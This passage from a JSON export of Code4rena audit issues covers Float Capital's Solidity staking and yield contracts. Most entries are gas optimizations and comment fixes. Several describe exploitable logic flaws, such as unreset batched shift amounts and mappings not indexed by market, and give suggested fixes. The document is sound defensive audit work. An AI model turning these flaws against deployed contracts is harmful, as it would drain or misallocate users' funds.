https://github.com/code-423n4/2021-08-floatcapital/blob/bd419abf68e775103df6e40d8f0e8d40156c2f81/contracts/contracts/YieldManagerAave.sol#L162-L167  Caching totalReservedForTreasury can save upto 1 SLOAD i.e. 100 gas: https://github.com/code-423n4/2021-08-floatcapital/blob/bd419abf68e775103df6e40d8f0e8d40156c2f81/contracts/contracts/YieldManagerAave.sol#L162-L167   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Cache storage-based state variables in local memory-based variables appropriately to convert SLOADs to MLOADs and reduce gas consumption from 100 units to 3 units.  "}, {"title": "YieldManagerAave.sol: Wrong branch in depositPaymentToken() if amountReservedInCaseOfInsufficientAaveLiquidity == amount", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/74", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-08-floatcapital-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  In the unlikely event `amountReservedInCaseOfInsufficientAaveLiquidity == amount`, the `else` case will be executed, which means `lendingPool.deposit()` is called with a value of zero. It would therefore be better to change the condition so that the `if` case is executed instead.  ### Recommended Mitigation Steps  ```jsx function depositPaymentToken(uint256 amount) external override longShortOnly {   // If amountReservedInCaseOfInsufficientAaveLiquidity isn't zero, then efficiently net the difference between the amount   // It basically always be zero besides extreme and unlikely situations with aave.   if (amountReservedInCaseOfInsufficientAaveLiquidity != 0) {   // instead of strictly greater than     if (amountReservedInCaseOfInsufficientAaveLiquidity >= amount) {       amountReservedInCaseOfInsufficientAaveLiquidity -= amount;       // Return early, nothing to deposit into the lending pool       return;     }  ... } ```  "}, {"title": "TokenFactory.sol: DEFAULT_ADMIN_ROLE has wrong value ", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/72", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "TokenFactory.sol: DEFAULT_ADMIN_ROLE has wrong value "}, {"title": "TokenFactory.sol: Appropriate type declaration to avoid numerous casting", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/71", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "TokenFactory.sol: Appropriate type declaration to avoid numerous casting"}, {"title": "Staker.sol: withdrawAll() does not include incoming outstanding shifts to the user", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/70", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged", "float-wont-fix"], "target": "2021-08-floatcapital-findings", "body": "Staker.sol: withdrawAll() does not include incoming outstanding shifts to the user"}, {"title": "Staker.sol: Updating kValue requires interpolation with initial timestamp", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/69", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  Updating a `kValue` of a market requires interpolation against the initial timestamp, which can be a hassle and might lead to a wrong value set from what is expected.   ### Proof of Concept  Consider the following scenario:  - Initially set `kValue = 2e18`, `kPeriod = 2592000` (30 days) - After 15 days, would like to refresh the market incentive (start again with `kValue = 2e18`), lasting another 30 days.  In the current implementation, the admin would call `_changeMarketLaunchIncentiveParameters()` with the following inputs:  - `period = 3888000` (45 days) - `kValue` needs to be worked backwards from the formula      `kInitialMultiplier - (((kInitialMultiplier - 1e18) * (block.timestamp - initialTimestamp)) / kPeriod)`. To achieve the desired effect, we would get `kValue = 25e17` (formula returns 2e18 after 15 days with kPeriod = 45 days).  This isn't immediately intuitive and could lead to mistakes.  ### Recommended Mitigation Steps  Instead of calculating from `initialTimestamp` (when `addNewStakingFund()` was called), calculate from when the market incentives were last updated. This would require a new mapping to store last updated timestamps of market incentives.  For example, using the scenario above, refreshing the market incentive would mean using inputs `period = 2592000` (30 days) with `kValue = 2e18`.  ```jsx // marketIndex => timestamp of updated market launch incentive params  mapping(uint32 => uint256) public marketLaunchIncentive_update_timestamps;  function _changeMarketLaunchIncentiveParameters(   uint32 marketIndex,   uint256 period,   uint256 initialMultiplier ) internal virtual {  require(initialMultiplier >= 1e18, \"marketLaunchIncentiveMultiplier must be >= 1e18\");    marketLaunchIncentive_period[marketIndex] = period;   marketLaunchIncentive_multipliers[marketIndex] = initialMultiplier;  marketLaunchIncentive_update_timestamps[marketIndex] = block.timestamp; };  function _getKValue(uint32 marketIndex) internal view virtual returns (uint256) {   // Parameters controlling the float issuance multiplier.   (uint256 kPeriod, uint256 kInitialMultiplier) = _getMarketLaunchIncentiveParameters(marketIndex);    // Sanity check - under normal circumstances, the multipliers should   // *never* be set to a value < 1e18, as there are guards against this.   assert(kInitialMultiplier >= 1e18);   // currently: uint256 initialTimestamp = accumulativeFloatPerSyntheticTokenSnapshots[marketIndex][0].timestamp;  // changed to take from last updated timestamp instead of initial timestamp   uint256 initialTimestamp = marketLaunchIncentive_update_timestamps[marketIndex];    if (block.timestamp - initialTimestamp <= kPeriod) {     return kInitialMultiplier - (((kInitialMultiplier - 1e18) * (block.timestamp - initialTimestamp)) / kPeriod);   } else {     return 1e18;   } }  ```  "}, {"title": "Staker.sol: TODO add link in comment", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/68", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-08-floatcapital-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  In `_calculateFloatPerSecond()`, there is an outstanding TODO in L437  `@dev to see below math in latex form see TODO add link`  The missing URL seems to be the one provided in the README on float [token rate issuance](https://www.overleaf.com/read/jpyhjgrvhfkr).  ### Recommended Mitigation Steps  Update / finish up the TODO.  "}, {"title": "Staker.sol: Shift event emissions to internal functions", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/67", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged", "float-wont-fix"], "target": "2021-08-floatcapital-findings", "body": "Staker.sol: Shift event emissions to internal functions"}, {"title": "Staker.sol: Redundant zero intialization for accumulativeFloatPerSyntheticTokenSnapshots", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/66", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "Staker.sol: Redundant zero intialization for accumulativeFloatPerSyntheticTokenSnapshots"}, {"title": "Staker.sol: Erroneous Comments", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/65", "labels": ["bug", "invalid", "1 (Low Risk)", "sponsor disputed", "disagree with severity"], "target": "2021-08-floatcapital-findings", "body": "Staker.sol: Erroneous Comments"}, {"title": "Staker.sol: Cache shift amounts", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/64", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  The user's `userNextPrice_amountStakedSyntheticToken_toShiftAwayFrom_long` and `userNextPrice_amountStakedSyntheticToken_toShiftAwayFrom_short` are retrieved a number of times in `_calculateAccumulatedFloat()`. Caching these values would help save gas.  Note that block scoping is needed to avoid the stack too deep problem.  ### Recommended Mitigation Steps  ```jsx function _calculateAccumulatedFloat() {  // block scope for shiftAmount variable to avoid stack too deep  {   // Update the users balances    uint256 shiftAmount = userNextPrice_amountStakedSyntheticToken_toShiftAwayFrom_long[marketIndex][user];    if (shiftAmount > 0) {      amountStakedShort += ILongShort(longShort).getAmountSyntheticTokenToMintOnTargetSide(        marketIndex,        shiftAmount,        true,        stakerTokenShiftIndex_to_longShortMarketPriceSnapshotIndex_mapping[usersShiftIndex]      );        amountStakedLong -= shiftAmount;      userNextPrice_amountStakedSyntheticToken_toShiftAwayFrom_long[marketIndex][user] = 0;    }      shiftAmount = userNextPrice_amountStakedSyntheticToken_toShiftAwayFrom_short[marketIndex][user]    if (shiftAmount > 0) {      amountStakedLong += ILongShort(longShort).getAmountSyntheticTokenToMintOnTargetSide(        marketIndex,        shiftAmount,        false,        stakerTokenShiftIndex_to_longShortMarketPriceSnapshotIndex_mapping[usersShiftIndex]      );        amountStakedShort -= shiftAmount;      userNextPrice_amountStakedSyntheticToken_toShiftAwayFrom_short[marketIndex][user] = 0;    }  }  // end of block scoping   // Save the users updated staked amounts  ... } ```  "}, {"title": "Spelling Errors", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/62", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Recommended Mitigation Steps  `derrived` \u2192 `derived`  `owerflow` \u2192 `overflow`  "}, {"title": "Single Source of Truth", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/61", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged", "float-wont-fix"], "target": "2021-08-floatcapital-findings", "body": "Single Source of Truth"}, {"title": "LongShort.sol: Some math can be unchecked in _getYieldSplit()", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/60", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "LongShort.sol: Some math can be unchecked in _getYieldSplit()"}, {"title": "LongShort.sol: Inconsistency in _claimAndDistributeYieldThenRebalanceMarket()", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/59", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed", "float-wont-fix"], "target": "2021-08-floatcapital-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  The comparison and effecting `valueChange` in `_claimAndDistributeYieldThenRebalanceMarket()` can be made consistent with the other functions.  ```jsx if (valueChange > 0) {  longValue += uint256(valueChange);  shortValue -= uint256(valueChange); } else {   longValue -= uint256(-valueChange);   shortValue += uint256(-valueChange); } ```  ### Recommended Mitigation Steps  Change the `else` case to `else if (valueChange < 0)`.  ```jsx if (valueChange > 0) {  longValue += uint256(valueChange);  shortValue -= uint256(valueChange); } else if (valueChange < 0) {   longValue -= uint256(-valueChange);   shortValue += uint256(-valueChange); } ```  "}, {"title": "LongShort.sol: Cache marketUpdateIndex[marketIndex]", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/58", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  By storing `marketUpdateIndex[marketIndex];` locally in `_updateSystemStateInternal()`, multiple sLOADs can be avoided.  ### Recommended Mitigation Steps  Gas savings of about 500-600 is achieved.  ```jsx function _updateSystemStateInternal(uint32 marketIndex) internal virtual requireMarketExists(marketIndex) {  ...  // cache marketUpdateIndex[marketIndex]   uint256 currentMarketIndex = marketUpdateIndex[marketIndex];    bool assetPriceHasChanged = oldAssetPrice != newAssetPrice;   if (assetPriceHasChanged || msg.sender == staker) {   uint256 syntheticTokenPrice_inPaymentTokens_long = syntheticToken_priceSnapshot[marketIndex][true][    currentMarketIndex     ];     uint256 syntheticTokenPrice_inPaymentTokens_short = syntheticToken_priceSnapshot[marketIndex][false][       currentMarketIndex     ];    if (       userNextPrice_currentUpdateIndex[marketIndex][staker] == currentMarketIndex + 1 &&       assetPriceHasChanged     ) {       IStaker(staker).pushUpdatedMarketPricesToUpdateFloatIssuanceCalculations(         marketIndex,         syntheticTokenPrice_inPaymentTokens_long,         syntheticTokenPrice_inPaymentTokens_short,         marketSideValueInPaymentToken[marketIndex][true],         marketSideValueInPaymentToken[marketIndex][false],         // This variable could allow users to do any next price actions in the future (not just synthetic side shifts)         currentMarketIndex + 1       );     } else {       IStaker(staker).pushUpdatedMarketPricesToUpdateFloatIssuanceCalculations(         marketIndex,         syntheticTokenPrice_inPaymentTokens_long,         syntheticTokenPrice_inPaymentTokens_short,         marketSideValueInPaymentToken[marketIndex][true],         marketSideValueInPaymentToken[marketIndex][false],         0       );     }   ...   // increment currentMarketIndex   currentMarketIndex ++;    marketUpdateIndex[marketIndex] = currentMarketIndex;   syntheticToken_priceSnapshot[marketIndex][true][    currentMarketIndex    ] = syntheticTokenPrice_inPaymentTokens_long;      syntheticToken_priceSnapshot[marketIndex][false][      currentMarketIndex    ] = syntheticTokenPrice_inPaymentTokens_short;   ...   emit SystemStateUpdated(      marketIndex,      currentMarketIndex,    ...   );  } } ```  "}, {"title": "Add reentrancy safeguards to user actions", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/57", "labels": ["bug", "invalid", "0 (Non-critical)", "sponsor disputed", "float-wont-fix"], "target": "2021-08-floatcapital-findings", "body": "Add reentrancy safeguards to user actions"}, {"title": "LongShort.sol & YieldManagerAave.sol: Verify / derive input arguments", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/56", "labels": ["bug", "duplicate", "0 (Non-critical)", "sponsor acknowledged", "float-wont-fix"], "target": "2021-08-floatcapital-findings", "body": "LongShort.sol & YieldManagerAave.sol: Verify / derive input arguments"}, {"title": "Index Events", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/55", "labels": ["bug", "duplicate", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-08-floatcapital-findings", "body": "Index Events"}, {"title": "Increase Solc Optimiser Runs", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/54", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed"], "target": "2021-08-floatcapital-findings", "body": "Increase Solc Optimiser Runs"}, {"title": "Immutable Variables", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/53", "labels": ["bug", "duplicate", "G (Gas Optimization)", "sponsor acknowledged", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "Immutable Variables"}, {"title": "Drop require checks for synthetic tokens", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/52", "labels": ["bug", "G (Gas Optimization)", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "Drop require checks for synthetic tokens"}, {"title": "Consider using SafeERC20 for ERC20 operations", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/51", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "Consider using SafeERC20 for ERC20 operations"}, {"title": "Appropriate storage variable type declaration to save on casting", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/50", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed"], "target": "2021-08-floatcapital-findings", "body": "Appropriate storage variable type declaration to save on casting"}, {"title": "Wrong aave usage of `claimRewards`", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/49", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-08-floatcapital-findings", "body": "# Handle  jonah1005   # Vulnerability details  ## Impact Aave yield manager claims rewards with the payment token. According to aave's document, aToken should be provided. The aave rewards would be unclaimable.  ## Proof of Concept YieldManager's logic: https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/YieldManagerAave.sol#L161-L170  Reference: https://docs.aave.com/developers/guides/liquidity-mining#claimrewards  ## Tools Used None ## Recommended Mitigation Steps Change to ```solidity     address[] memory rewardsDepositedAssets = new address[](1);     rewardsDepositedAssets[0] = address(aToken); ```   "}, {"title": "LongShort should not shares the same Yield Manager between different markets", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/48", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed", "resolved"], "target": "2021-08-floatcapital-findings", "body": "# Handle  jonah1005   # Vulnerability details  # LongShort should not shares the same Yield Manager between different markets ## Impact The LongShort contract would not stop different markets from using the same yield manager contracts. Any extra aToken in the yield manager would be considered as market incentives in function `distributeYieldForTreasuryAndReturnMarketAllocation`. Thus, using the same yield manager for different markets would break the markets and allow users to withdraw fund that doesn't belong to them.   ## Proof of Concept https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/YieldManagerAave.sol#L179-L204  ## Tools Used None  ## Recommended Mitigation Steps Given the fluency of programming skills the dev shows, I believe they wouldn't make this mistake on deployment. Still, I think there's space to improve in the YieldManagerAave contract. IMHO. As it's tightly coupled with longshort contract and its market logic, a initialize market function in the yield manager seems more reasonable.  "}, {"title": "Gas optimization for withdraw and withdrawAll", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/44", "labels": ["bug", "duplicate", "G (Gas Optimization)", "sponsor confirmed", "resolved"], "target": "2021-08-floatcapital-findings", "body": "# Handle  0xImpostor   # Vulnerability details  ## Impact  Use `marketIndex` to updateSystemState instead of querying `marketIndexOfToken[token]` twice.  ## Proof of Concept  Swap line 949 with 951 and swap line 974 with 976.  For example  ``` function withdrawAll(address token) external {     uint32 marketIndex = marketIndexOfToken[token];      ILongShort(longShort).updateSystemState(marketIndex);      uint256 amountToShiftForThisToken = syntheticTokens[marketIndex][true] == token       ? userNextPrice_amountStakedSyntheticToken_toShiftAwayFrom_long[marketIndex][msg.sender]       : userNextPrice_amountStakedSyntheticToken_toShiftAwayFrom_short[marketIndex][msg.sender];      _withdraw(marketIndex, token, userAmountStaked[token][msg.sender] - amountToShiftForThisToken);   }  ```  ## Tools Used  Manual analysis  "}, {"title": "Pass time delta into internal functions", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/42", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed"], "target": "2021-08-floatcapital-findings", "body": "Pass time delta into internal functions"}, {"title": "FloatToken would revoke stakerAddress's permission if msg.sender == stakerAddress", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/36", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed", "resolved"], "target": "2021-08-floatcapital-findings", "body": "# Handle  jonah1005   # Vulnerability details  ## Impact FloatToken would revoke staker's permission if msg.sender == stakerAddress. In `initializeFloatToken` the contract would first grant roles to `stakerAddress` and than revoke`msg.sender`'s permissions. The contract would be left with no privileged address if stakerAddress == msg.sender.   ## Proof of Concept https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/FloatToken.sol#L21-L35  ## Tools Used None ## Recommended Mitigation Steps  ```solidity   function initializeFloatToken(     string calldata name,     string calldata symbol,     address stakerAddress   ) external initializer {     initialize(name, symbol);      renounceRole(DEFAULT_ADMIN_ROLE, msg.sender);     renounceRole(MINTER_ROLE, msg.sender);     renounceRole(PAUSER_ROLE, msg.sender);        _setupRole(DEFAULT_ADMIN_ROLE, stakerAddress);     _setupRole(MINTER_ROLE, stakerAddress);     _setupRole(PAUSER_ROLE, stakerAddress);   } ```  "}, {"title": "Solution is susceptible to MEV, harming users.", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/30", "labels": ["bug", "invalid", "0 (Non-critical)", "sponsor disputed"], "target": "2021-08-floatcapital-findings", "body": "Solution is susceptible to MEV, harming users."}, {"title": "Docstring", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/27", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "# Handle  evertkors   # Vulnerability details  A lot of docstrings for marketIndex are ` @param marketIndex An int32 which uniquely identifies a market.` but it is a `uint32` not an `int32`  "}, {"title": "Internal _withdraw, reading from storage twice.", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/26", "labels": ["bug", "duplicate", "G (Gas Optimization)", "sponsor disputed"], "target": "2021-08-floatcapital-findings", "body": "Internal _withdraw, reading from storage twice."}, {"title": "Multiple initialize functions", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/19", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor acknowledged", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "Multiple initialize functions"}, {"title": "gas improvement in withdraw & withdrawAll", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/18", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor acknowledged", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "gas improvement in withdraw & withdrawAll"}, {"title": "slight difference between withdraw and withdrawAll", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/17", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor acknowledged", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "slight difference between withdraw and withdrawAll"}, {"title": "Prevent markets getting stuck when prices don't move", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/16", "labels": ["bug", "2 (Med Risk)", "sponsor disputed", "disagree with severity", "float-wont-fix"], "target": "2021-08-floatcapital-findings", "body": "Prevent markets getting stuck when prices don't move"}, {"title": "PERMANENT_INITIAL_LIQUIDITY_HOLDER not 100% safe", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/15", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-08-floatcapital-findings", "body": "PERMANENT_INITIAL_LIQUIDITY_HOLDER not 100% safe"}, {"title": "extra safety in distributeYieldForTreasuryAndReturnMarketAllocation", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/14", "labels": ["bug", "invalid", "0 (Non-critical)", "sponsor disputed", "disagree with severity"], "target": "2021-08-floatcapital-findings", "body": "extra safety in distributeYieldForTreasuryAndReturnMarketAllocation"}, {"title": "prevent reentrancy", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/13", "labels": ["bug", "1 (Low Risk)", "sponsor disputed", "disagree with severity", "resolved", "out-of-scope", "float-wont-fix"], "target": "2021-08-floatcapital-findings", "body": "prevent reentrancy"}, {"title": "confusing comments", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/12", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed", "resolved", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact I've seen comments which are confusing: ~10^31 or 10 Trillion (10^13) ==> probably should be 2^31 x * 5e17` == `(x * 10e18) / 2`   ==> probably should be 1e18/2  ## Proof of Concept //https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/Staker.sol#L19 // 2^52 ~= 4.5e15   // With an exponent of 5, the largest total liquidity possible in a market (to avoid integer overflow on exponentiation) is ~10^31 or 10 Trillion (10^13)  //https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/Staker.sol#L480       // NOTE: `x * 5e17` == `(x * 10e18) / 2`  ## Tools Used  ## Recommended Mitigation Steps Double check the comments  "}, {"title": "Constant values used inline", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/11", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged", "float-wont-fix"], "target": "2021-08-floatcapital-findings", "body": "Constant values used inline"}, {"title": "extra checks in addNewStakingFund", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/10", "labels": ["bug", "1 (Low Risk)", "sponsor disputed", "disagree with severity"], "target": "2021-08-floatcapital-findings", "body": "extra checks in addNewStakingFund"}, {"title": "latestMarket used where marketIndex should have been used", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/9", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "resolved", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact The functions initializeMarket and _seedMarketInitially use the variable latestMarket. If these functions would be called seperately from createNewSyntheticMarket, then latestMarket would have the same value for each call of initializeMarket and _seedMarketInitially   This would mean that the latestMarket is initialized multiple times and the previous market(s) are not initialized properly. Note: the call to addNewStakingFund could have prevented this issue, but also allows this, see separate issue.  Note: the functions can only be called by the admin, so if createNewSyntheticMarket and initializeMarket are called in combination, then it would not lead to problems, but in future release of the software the calls to createNewSyntheticMarket and initializeMarket might get separated.  ## Proof of Concept //https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/LongShort.sol#L304 function _seedMarketInitially(uint256 initialMarketSeedForEachMarketSide, uint32 marketIndex) internal virtual {    ...     ISyntheticToken(syntheticTokens[latestMarket][true]).mint(PERMANENT_INITIAL_LIQUIDITY_HOLDER,initialMarketSeedForEachMarketSide);   // should be marketIndex     ISyntheticToken(syntheticTokens[latestMarket][false]).mint(PERMANENT_INITIAL_LIQUIDITY_HOLDER,initialMarketSeedForEachMarketSide);  // should be marketIndex    function initializeMarket(      uint32 marketIndex,....)   ...     require(!marketExists[marketIndex], \"already initialized\");     require(marketIndex <= latestMarket, \"index too high\");      marketExists[marketIndex] = true; ..     IStaker(staker).addNewStakingFund(       latestMarket,                                       // should be marketIndex       syntheticTokens[latestMarket][true],   // should be marketIndex       syntheticTokens[latestMarket][false],  // should be marketIndex   ...  ## Tools Used  ## Recommended Mitigation Steps Replace latestMarket with marketIndex in the functions initializeMarket and _seedMarketInitially  p.s. confirmed by Jason of float capital: Definitely an issue, luckily both of those functions are adminOnly. But that is definitely not ideal!  "}, {"title": "2 variables not indexed by marketIndex", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/8", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "resolved", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact In the token contract: batched_stakerNextTokenShiftIndex is indexed by marketIndex, so it can have separate (or the same) values for each different marketIndex.  stakerTokenShiftIndex_to_longShortMarketPriceSnapshotIndex_mapping and stakerTokenShiftIndex_to_accumulativeFloatIssuanceSnapshotIndex_mapping are not indexed by marketIndex So the values of stakerTokenShiftIndex_to_longShortMarketPriceSnapshotIndex_mapping and stakerTokenShiftIndex_to_accumulativeFloatIssuanceSnapshotIndex_mapping  can be overwritten by a different market, if batched_stakerNextTokenShiftIndex[market1]==batched_stakerNextTokenShiftIndex [market2]  This will lead to weird results in _calculateAccumulatedFloat, allocating too much or too little float.  ## Proof of Concept // https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/Staker.sol#L622     function pushUpdatedMarketPricesToUpdateFloatIssuanceCalculations(     ...       stakerTokenShiftIndex_to_longShortMarketPriceSnapshotIndex_mapping[ batched_stakerNextTokenShiftIndex[marketIndex]  ] = stakerTokenShiftIndex_to_longShortMarketPriceSnapshotIndex_mappingIfShiftExecuted;       stakerTokenShiftIndex_to_accumulativeFloatIssuanceSnapshotIndex_mapping[  batched_stakerNextTokenShiftIndex[marketIndex]  ] = latestRewardIndex[marketIndex] + 1;       batched_stakerNextTokenShiftIndex[marketIndex] += 1; ...  ## Tools Used  ## Recommended Mitigation Steps Add an index with marketIndex to the variables: - stakerTokenShiftIndex_to_longShortMarketPriceSnapshotIndex_mapping  - stakerTokenShiftIndex_to_accumulativeFloatIssuanceSnapshotIndex_mapping   Also consider shortening the variable names, this way mistakes can be spotted easier.  Confirmed by Jason of Float Capital: Yes, you are totally right, it should use the marketIndex since they are specific per market!  "}, {"title": "Staker.sol: Wrong values returned in edge cases of _calculateFloatPerSecond()", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/6", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "resolved", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "# Handle \r \r hickuphh3\r \r # Vulnerability details\r \r ### Impact\r \r In `_calculateFloatPerSecond()`, the edge cases where full rewards go to either the long or short token returns\r \r `return (1e18 * k * longPrice, 0);` and\r \r `return (0, 1e18 * k * shortPrice);` respectively. \r \r This is however `1e18` times too large. We can verify this by checking the equivalent calculation in the 'normal case', where we assume all the rewards go to the short token, ie. `longRewardUnscaled = 0`  and `shortRewardUnscaled = 1e18`. Plugging this into the calculation below,\r \r `return ((longRewardUnscaled * k * longPrice) / 1e18, (shortRewardUnscaled * k * shortPrice) / 1e18);` results in\r \r `(0, 1e18 * k * shortPrice / 1e18)` or `(0, k * shortPrice)`.\r \r As we can see, this would result in an extremely large float token issuance rate, which would be disastrous.\r \r ### Recommended Mitigation Steps\r \r The edge cases should return `(k * longPrice, 0)` and `(0, k * shortPrice)` in the cases where rewards should go fully to long and short token holders respectively."}, {"title": "copy paste error in _batchConfirmOutstandingPendingActions", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/5", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "resolved", "fixed-in-upstream-repo"], "target": "2021-08-floatcapital-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact The function _batchConfirmOutstandingPendingActions of LongShort.sol processeses the variable batched_amountSyntheticToken_toShiftAwayFrom_marketSide, and sets it to 0 after processing. However probably due to a copy/paste error, in the second instance, where batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][false] is processed, the wrong version is set to 0: batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][true] = 0  This means the next time the batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][false] is processed again. As it is never reset, it keeps increasing. The result is that the internal administration will be off and far too many tokens will be shifted tokens from SHORT to LONG.  ## Proof of Concept //https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/LongShort.sol#L1126 LongShort.sol function _batchConfirmOutstandingPendingActions( ..     amountForCurrentAction_workingVariable = batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][true];     batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][true] = 0; ...         amountForCurrentAction_workingVariable = batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][false];            